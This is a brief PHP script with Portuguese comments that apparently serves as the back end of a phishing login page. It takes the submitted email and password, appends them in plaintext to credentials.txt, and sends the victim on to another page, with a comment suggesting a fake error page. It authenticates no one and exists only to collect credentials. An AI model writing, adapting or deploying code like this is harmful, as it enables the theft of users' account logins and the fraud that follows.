<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Sanitizar os dados
    $email = htmlspecialchars($email);
    $password = htmlspecialchars($password);

    // Salvar credenciais em um arquivo
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Email: " . $email . " | Senha: " . $password . "\n");
    fclose($file);

    // Redirecionar para uma página de erro (ou qualquer outra página)
    header("Location: success.html");
    exit();
} else {
    // Redirecionar para a página de login se o método não for POST
    header("Location: index.html");
    exit();
}
?>

